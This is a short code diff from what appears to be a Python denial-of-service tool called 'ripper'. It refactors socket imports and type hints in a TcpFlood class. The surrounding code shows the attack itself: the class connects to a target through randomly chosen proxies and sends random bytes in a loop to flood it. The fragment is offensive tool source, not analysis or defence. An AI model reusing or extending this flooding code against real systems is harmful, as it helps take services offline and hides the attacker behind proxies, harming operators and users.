@@ -1,4 +1,4 @@
-import socket
+from socket import socket
 from contextlib import suppress
 from random import randbytes
 from typing import Tuple, Any
@@ -9,7 +9,7 @@ from ripper.context import Context, Errors
 
 
 class TcpFlood:
-    _sock: socket.socket
+    _sock: socket
     _target: Tuple[str, int]
     _ctx: Context
     _proxy: Any = None
@@ -18,7 +18,7 @@ class TcpFlood:
         self._target = target
         self._ctx = context
 
-    def create_connection(self) -> socket.socket:
+    def create_connection(self) -> socket:
         self._proxy = self._ctx.proxy_manager.get_random_proxy()
         conn = self._ctx.sock_manager.create_tcp_socket(self._proxy)
         conn.connect(self._target)
@@ -31,7 +31,7 @@ class TcpFlood:
             while self.send(s):
                 continue
 
-    def send(self, sock: socket.socket) -> bool:
+    def send(self, sock: socket) -> bool:
         try:
             sock.send(randbytes(self._ctx.max_random_packet_len))
         except ProxyError:
